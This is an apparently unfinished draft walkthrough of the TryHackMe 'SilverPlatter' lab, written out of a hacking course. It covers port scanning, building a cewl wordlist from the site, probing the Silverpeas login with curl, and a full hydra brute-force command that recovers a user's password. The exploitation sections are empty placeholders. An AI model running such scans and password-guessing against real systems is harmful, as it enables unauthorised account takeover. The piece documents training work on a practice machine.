---
layout: default
title: "TryHackMe: SilverPlatter Walkthrough (Easy)"
date: 2025-07-16
---

# SilverPlatter Walkthrough (Easy)

## Overview
As part of the class [Introduction to Hacking Methodology](https://academy.simplycyber.io/p/introduction-to-hacking-methodology)
I took [these notes](https://www.notion.so/Introduction-to-Hacking-Methodology-GitHub-Pages-23346f98ca3080d18194f3b09c709143?source=copy_link) while hacking a machine called silver-platter.

This is an introductory class and the difficulty of the Linux machine is fairly low; still, this is the first mtime that I have managed to hack one (with some help from one video) and I am very proud of it, so I decided to put this page together to help other students like me. My main focus is in highlighting the reasoning behind the commands, as opposed to simply listing all the required steps without justification or context.

When you look at my solution, do not get discouraged because you fear you would never think about doing some of these things, instead consider that:
1. I have been studying hacking for 6 solid months, and so far this easy machine is all I have to show for it.
2. I used Claude AI to help me every step of the way.
3. I am a software engineer that has been working for 25 years in Silicon Valley.
4. It took me 12 days to completely solve this machine and find both flags (5 days to find the first one.)
5. Since I was stuck during the privesc phase, I had to give a peek to a video in the course that essentially says "I am not gonna tell you yet how to privesc this machine, but I am going to tell you that it has something to do with the fact that tim belongs to the adm group." Sincerely, I don't know how many times I had already looked at the logs and didn't see the password, but once I knew that the solution HAD to be in the logs, I was finally able to see it; so what did I spend the last 7 days doing? In short, chasing rabbit holes, but it does not mean that it was all for nothing, in fact I believe that trying and failing is how I will eventually learn how to hack faster.

## Reconnaissance (information gathering)

### Port Scanning
We start with port scanning, that normally means using nmap; we are going to use nmap indirectly via rustscan because rustscan is fast, and we like not having to wait too long; the output is very long, so we are going to cut it down to the essential parts.

```
┌──(kali㉿kali)-[/opt]
└─$ rustscan -a 10.10.160.74 -- -A

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       syn-ack ttl 61 nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy syn-ack ttl 60

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   79.35 ms  10.6.0.1
2   ... 3
4   149.33 ms silverplatter.thm (10.10.160.74)
```

From the TRACEROUTE section we see that the domain name is **silverplatter.thm** with IPv4 address **10.10.160.74**

Action: we add both the domain and the IPv4 address to the /etc/hosts file, so we will be better able to reuse our commands even if the IP address of the VM changes (because the VM's timeout expires):

Inside the **/etc/hosts** file:

```
[...]
10.10.160.74    silverplatter.thm
[...]
```

### 22/tcp (ssh) OpenSSH 8.9p1 [part 1]
From the port scanning output we gather that OpenSSH is on version 8.9p1 .

### 80/tcp (http) nginx 1.18.0 (Ubuntu)
From the port scanning output we gather that nginx (static web server) is on version 1.18.0 and that the operating system is Ubuntu Linux.

### silverplatter.thm:80
Since on port 80 we have a web server, the first thing we are going to do is to point a web browser to http://silverplatter.thm:80 and visually check the web site.

From the Contact section:

```
Contact

If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
```

we collect the following information
- Username: scr1ptkiddy
- Role: project manager
- Silverpeas (likely on port 8080)

So, it appears that there is a Silverpeas server (later we will find that it does run on port 8080) with a user named **scr1ptkiddy**, but we don't know the corresponding password yet.

It is also important, when looking at a web site, to use the View Source feature of all modern web brosers to see whether there are any obvious pieces of interesting information left by the developers in comments (things like users, passwords, and generally speaking, any type of information disclosure that would help us gain an advantage in our attempt to get into the machine.) Unfortunately, in this particular web site's source code there is nothing noteworthy.

### cewl
Since we know about a user named scr1ptkiddy for a Silverpeas server running on the machine we are attacking, it is worth collecting all keywords from the web pages of the web site, and later try to use a program like hydra to find the password for scr1ptkiddy.

Here is the command to scan the web site and collect all its keywords in a file:
cewl http:silverplatter.thm > silverplatter_keywords.txt

This command collects all keywords in silverplatter.thm and saves them into a file.

### hydra
We are going to use hydra to spray all the passwords in silverplatter_keywords.txt .

hydra requires several parameters.
First we run this command to learn more about how to authenticate with Silverpeas:

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -s http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp | grep -E 'name=|type="password"|type="text"'
  <meta name="viewport" content="initial-scale=1.0"/>
          <label><span>Login</span><input type="text" name="Login" id="Login"/></label>
          <label><span>Password</span><input type="password" name="Password" id="Password" autocomplete="off"/></label>
            <input class="noDisplay" type="hidden" name="DomainId" value="0"/>
```

From the above output we see that the DomainId=0 hidden field is critical for Silverpeas authentication.

But we also need to identify a pattern in the Silverpeas’ response that allows us to identify incorrect passwords, so we run this command passing a "wrong password" on purpose (btw, wouldn't it be funny if we realized that 'wrongpassword' were the correct password?!):

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -v -d "Login=scr1ptkiddy&Password=wrongpassword" http://silverplatter.thm:8080/silverpeas/AuthenticationServlet
...
Location: http://silverplatter.thm:8080/silverpeas/Login?ErrorCode=1&DomainId=-1
...
```

From the above we see that ErrorCode=1 appears in Silverpeas' responses when the server rejects incorrect passwords.

So, putting all of the above together, we get to finally write this hydra command:

```
┌──(kali㉿kali)-[/tmp]
└─$ hydra -l scr1ptkiddy -P silverplatter_keywords.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:ErrorCode=1"
...
[8080][http-post-form] host: silverplatter.thm   login: scr1ptkiddy   password: adipiscing
...
```

*** PROBLEM: WE HAVEN'T EXPLAINED HOW WE KNOW THAT SILVERPEAS RUNS ON PORT 8080.

From the above output we see that adipiscing is the correct password for scr2ptkiddy.

### 8080/tcp (http-proxy)
Browsing to http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp we enter scr1ptkiddy and adipiscing:

*** PUT SCREENSHOT HERE

## Exploitation (use information gathered during reconnaissance)
Step-by-step walkthrough...


## Lessons Learned
Key takeaways from this challenge...
